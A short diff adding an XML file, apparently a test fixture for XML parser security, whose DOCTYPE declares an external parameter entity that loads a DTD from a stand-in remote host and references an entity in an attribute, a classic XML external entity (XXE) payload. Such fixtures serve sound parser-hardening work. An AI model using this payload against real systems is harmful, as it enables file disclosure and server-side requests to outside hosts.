@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd">
+%remote;
+]>
+<data attrib='&internal;'/>
